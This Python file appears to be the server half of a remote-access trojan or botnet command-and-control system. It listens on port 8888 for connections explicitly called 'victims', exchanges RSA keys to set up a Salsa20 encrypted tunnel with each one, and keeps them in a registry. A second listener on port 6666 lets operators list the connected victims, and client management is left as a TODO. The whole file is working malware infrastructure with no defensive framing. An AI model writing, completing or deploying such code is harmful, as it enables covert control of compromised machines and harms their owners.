import asyncio
import rsa
import zlib

from Crypto.Random import get_random_bytes

from lib.crypto import EncryptedTunnel

BUFFER = 1024
VICTIMS: dict = {}
CLIENTS: dict = {}

async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
    # Get addr socket
    peername = w.get_extra_info('peername')
    formated_peername = peername[0] + ':' + str(peername[1])
    
    # Get a fingerprint (random string)
    fingerprint = await r.read(BUFFER)

    # Generate rsa keys
    # will be used for key exchange + nonce to start communicating only with Salsa20
    # (which allows its larger data exchange)
    public_key, private_key = rsa.newkeys(1024)    

    w.write(rsa.PublicKey.save_pkcs1(public_key))
    await w.drain()

    # Gets the RSA-encrypted string containing the key and nonce
    # splits the string using '<SPR>' as the separator
    key, nonce = zlib.decompress(rsa.decrypt(await r.read(BUFFER), private_key)).split(b"<SPR>")

    # Initializes the 'EncryptedTunnel' class that allows communication with the client using Salsa20,
    # using the key and nonce obtained previously
    enctunnel = EncryptedTunnel(r, w, key, nonce)

    # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
    VICTIMS[formated_peername] = [fingerprint, "pcname", enctunnel]

# TODO: client management

async def handle_clients(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
    username = await r.read(BUFFER)

    w.write(''.join(VICTIMS.keys()).encode());
    await w.drain()

    CLIENTS[username] = (w, r)

async def run_forever(server):
    async with server:
        await server.serve_forever()

async def main():
    # Open multiple server
    server_victims = await asyncio.start_server(handle_victims, '0.0.0.0', 8888)
    server_clients = await asyncio.start_server(handle_clients, '0.0.0.0', 6666)

    # Looping servers
    async with asyncio.TaskGroup() as tg:
        _task_victims = tg.create_task(
            run_forever(server_victims)
        )

        _task_clients = tg.create_task(
            run_forever(server_clients)
        )

if __name__ == "__main__":
    asyncio.run(main())